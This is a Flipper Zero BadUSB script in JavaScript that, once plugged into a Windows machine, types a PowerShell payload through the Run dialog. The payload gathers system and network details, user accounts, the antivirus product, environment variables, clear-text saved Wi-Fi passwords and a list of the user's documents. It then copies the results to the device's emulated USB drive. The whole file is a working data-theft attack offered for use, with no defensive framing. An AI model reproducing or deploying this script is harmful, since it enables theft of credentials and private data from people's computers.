let image = "/ext/apps_data/mass_storage/Exfil_Win.img";
let size = 32 * 1024 * 1024;
let script = [
        "$Date = Get-Date -Format yyyy-MM-dd;", // Get Date
    "$Time = Get-Date -Format hh-mm-ss;", // Get Time
    "Get-CimInstance -ClassName Win32_ComputerSystem >> stats.txt;", // Listing computer manufacturer and model
    "Get-LocalUser >> stats.txt;", // List users on the system 
    "Get-LocalUser | Where-Object -Property PasswordRequired -Match false >> stats.txt;", // Which users have password required set to false
    "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct >> stats.txt;", // List which AntiVirus Product is being used
    "Get-CimInstance -ClassName Win32_QuickFixEngineering >> stats.txt;", // Listing installed hotfixes
    "(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\\\W+\\\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;", // Get network profiles with passwords
    "dir env: >> stats.txt;", // Check ENV
    "Get-Computerinfo >> stats.txt;", // ComputerInfo
    "Get-Service >> stats.txt;", // Get running services 
    "Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\\d+.\\d+)' >> stats.txt;", // Check all IPV4 suffixes that are not localhost
    "Get-NetTCPConnection | Where-Object -Property State -Match Listen >> stats.txt;", // List listening ports
    "Get-NetTCPConnection | Select-Object -Property * >> stats.txt;", // Get TCP information, ports, state, etc.
    "Get-ChildItem -Path $userDir -Include *.txt, *.doc, *.docx, *.pptx, *.xlsx, *.pdf, *.jpg, *.png, *.mp3, *.mp4, *.zip, *.rar -Recurse >> stats.txt" // Exfil FileNames
];

let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

print("Checking for Image...");
if (storage.fileExists(image)) {
    print ("Storage Exists.");
}
else {
        print ("Creating Storage...");
        usbdisk.createImage(image, size);
}

badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/<add layout here>" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.press("GUI", "r"); // Open Run
delay(500);
badusb.println("powershell");
badusb.press("ENTER");
print("Running payload");
badusb.println(command, 10);
badusb.press("ENTER");
badusb.println("echo 'Please wait until this Window closes to eject the disk!'; Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path stats.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; exit")
badusb.press("ENTER");
badusb.quit();

delay(2000);
usbdisk.start(image);
print("Please wait until powershell window closes to eject...");

while (!usbdisk.wasEjected()) {
    delay(1000);
}
usbdisk.stop();
print("Done");